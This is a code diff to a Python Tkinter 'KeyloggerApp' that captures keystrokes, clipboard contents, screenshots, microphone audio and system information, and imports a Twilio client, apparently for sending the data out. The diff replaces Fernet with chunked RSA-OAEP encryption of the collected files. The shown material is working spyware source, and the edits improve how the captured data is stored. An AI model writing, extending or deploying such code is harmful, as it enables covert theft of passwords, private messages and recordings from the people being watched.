@@ -10,10 +10,12 @@ from tkinter import scrolledtext
 from requests import get
 from PIL import ImageGrab
 from scipy.io.wavfile import write
-from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
 import threading
 from twilio.rest import Client
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import hashes, serialization
 
 class KeyloggerApp:
     def __init__(self, master):
@@ -73,15 +75,8 @@ class KeyloggerApp:
         self.time_iteration = 15
         self.number_of_iterations_end = 3
         
-        # Generate and save encryption key
-        self.key = Fernet.generate_key()
-        self.fernet = Fernet(self.key)
-        
-        # Save the key to a file in the Cryptography folder
-        self.key_file = os.path.join(self.cryptography_folder, "encryption_key.key")
-        with open(self.key_file, "wb") as key_file:
-            key_file.write(self.key)
-        self.log_message(f"Encryption key saved to: {self.key_file}")
+        # Generate RSA key pair instead of Fernet key
+        self.generate_rsa_keys()
         
         self.is_running = False
         self.keylogger_thread = None
@@ -94,6 +89,44 @@ class KeyloggerApp:
         self.log_area.insert(tk.END, f"Cryptography folder: {self.cryptography_folder}\n")
         self.log_area.insert(tk.END, "Ready to start monitoring...\n")
         self.log_area.see(tk.END)
+
+    def generate_rsa_keys(self):
+        """Generate RSA key pair and save to files"""
+        self.log_message("Generating RSA key pair...")
+        
+        # Generate private key
+        private_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=2048,
+            backend=default_backend()
+        )
+        
+        # Generate public key from private key
+        public_key = private_key.public_key()
+        
+        # Save the private key
+        private_key_path = os.path.join(self.cryptography_folder, "private_key.pem")
+        with open(private_key_path, "wb") as f:
+            f.write(private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.TraditionalOpenSSL,
+                encryption_algorithm=serialization.NoEncryption()
+            ))
+        
+        # Save the public key
+        public_key_path = os.path.join(self.cryptography_folder, "public_key.pem")
+        with open(public_key_path, "wb") as f:
+            f.write(public_key.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            ))
+        
+        # Load the public key for encryption
+        self.public_key = public_key
+        
+        self.log_message(f"RSA key pair generated:")
+        self.log_message(f"Private key: {private_key_path}")
+        self.log_message(f"Public key: {public_key_path}")
 
     def log_message(self, message):
         self.log_area.insert(tk.END, f"{message}\n")
@@ -175,8 +208,52 @@ class KeyloggerApp:
         
         self.log_message("Screenshot saved")
 
+    def rsa_encrypt_file(self, file_path, output_path):
+        """Encrypt a file using RSA encryption with chunking for large files"""
+        try:
+            # RSA can only encrypt small chunks of data, so we need to chunk the data
+            # RSA with OAEP padding can encrypt data that is no more than the key size in bytes - 2 - 2*hash_size_in_bytes
+            # For RSA 2048 and SHA256, this is approximately 190 bytes
+            chunk_size = 190
+            
+            with open(file_path, 'rb') as f:
+                data = f.read()
+            
+            # If file is large, this will be inefficient with RSA
+            # For a real implementation, you'd typically use hybrid encryption
+            # (encrypt data with AES, then encrypt the AES key with RSA)
+            # But for simplicity, we'll use direct RSA with chunking
+            
+            encrypted_chunks = []
+            for i in range(0, len(data), chunk_size):
+                chunk = data[i:i+chunk_size]
+                encrypted_chunk = self.public_key.encrypt(
+                    chunk,
+                    padding.OAEP(
+                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                        algorithm=hashes.SHA256(),
+                        label=None
+                    )
+                )
+                encrypted_chunks.append(encrypted_chunk)
+            
+            # Write encrypted chunks to file
+            with open(output_path, 'wb') as f:
+                # First write the number of chunks as a 4-byte integer
+                f.write(len(encrypted_chunks).to_bytes(4, byteorder='big'))
+                for chunk in encrypted_chunks:
+                    # Write the length of this chunk as a 4-byte integer
+                    f.write(len(chunk).to_bytes(4, byteorder='big'))
+                    # Write the chunk itself
+                    f.write(chunk)
+            
+            return True
+        except Exception as e:
+            self.log_message(f"Encryption error: {str(e)}")
+            return False
+
     def encrypt_files(self):
-        self.log_message("Encrypting collected data...")
+        self.log_message("Encrypting collected data with RSA...")
         
         files_to_encrypt = [
             self.file_merge + self.system_information, 
@@ -192,21 +269,17 @@ class KeyloggerApp:
         
         for i, file_path in enumerate(files_to_encrypt):
             try:
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                
-                self.log_message(f"Data size for {os.path.basename(file_path)}: {len(data)} bytes")
-                encrypted = self.fernet.encrypt(data)
-                
-                with open(encrypted_file_names[i], 'wb') as f:
-                    f.write(encrypted)
+                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+                    success = self.rsa_encrypt_file(file_path, encrypted_file_names[i])
                     
-                self.log_message(f"Encrypted: {os.path.basename(file_path)} → {os.path.basename(encrypted_file_names[i])}")
+                    if success:
+                        self.log_message(f"Encrypted: {os.path.basename(file_path)} → {os.path.basename(encrypted_file_names[i])}")
+                    else:
+                        self.log_message(f"Failed to encrypt: {os.path.basename(file_path)}")
+                else:
+                    self.log_message(f"Skipping empty or non-existent file: {os.path.basename(file_path)}")
             except Exception as e:
-                self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
-                self.log_message(f"Failed to encrypt {os.path.basename(file_path)}")
-            except Exception as e:
-                self.log_message(f"Encryption error for {os.path.basename(file_path)}: {str(e)}")
+                self.log_message(f"Error processing {os.path.basename(file_path)}: {str(e)}")
         
         self.log_message("Encryption complete")
 
@@ -257,7 +330,8 @@ class KeyloggerApp:
         
         self.log_message("Cleanup complete")
 
-    def keylogger_function(self):
+    def keylogger_function(self): 
+
         self.log_message("Starting keylogger...")
         
         # Create or clear the keylogger file
@@ -339,37 +413,37 @@ class KeyloggerApp:
                 elif k.find("Key") == -1:
                     f.write(k)
 
-    def start_keylogger(self):
-        if not self.is_running:
+    def start_keylogger(self): 
+        if not self.is_running: 
             self.is_running = True
             self.status_label.config(text="Status: Running")
             
-            self.log_message("=== Starting monitoring session ===")
-            self.computer_information()
-            self.copy_clipboard()
-            self.screenshot()
+            self.log_message("=== Starting monitoring session ===") 
+            self.computer_information() 
+            self.copy_clipboard() 
+            self.screenshot() 
             
-            try:
-                self.microphone_recording()
-            except:
-                self.log_message("Error: Could not record audio")
+            try: 
+                self.microphone_recording() 
+            except: 
+                self.log_message("Error: Could not record audio") 
             
-            self.keylogger_thread = threading.Thread(target=self.keylogger_function, daemon=True)
-            self.keylogger_thread.start()
+            self.keylogger_thread = threading.Thread(target=self.keylogger_function, daemon=True) 
+            self.keylogger_thread.start() 
 
-    def stop_keylogger(self):
-        if self.is_running:
-            self.log_message("Stopping all monitoring activity...")
-            self.is_running = False
+    def stop_keylogger(self): 
+        if self.is_running: 
+            self.log_message("Stopping all monitoring activity...") 
+            self.is_running = False 
             
-            if hasattr(self, 'listener') and self.listener.is_alive():
-                self.listener.stop()
+            if hasattr(self, 'listener') and self.listener.is_alive(): 
+                self.listener.stop() 
             
-            if self.keylogger_thread and self.keylogger_thread.is_alive():
-                self.keylogger_thread.join(1.0)
+            if self.keylogger_thread and self.keylogger_thread.is_alive(): 
+                self.keylogger_thread.join(1.0) 
             
-            self.status_label.config(text="Status: Stopped")
-            self.log_message("=== Monitoring stopped ===")
+            self.status_label.config(text="Status: Stopped") 
+            self.log_message("=== Monitoring stopped ===") 
 
 if __name__ == "__main__":
     root = tk.Tk()
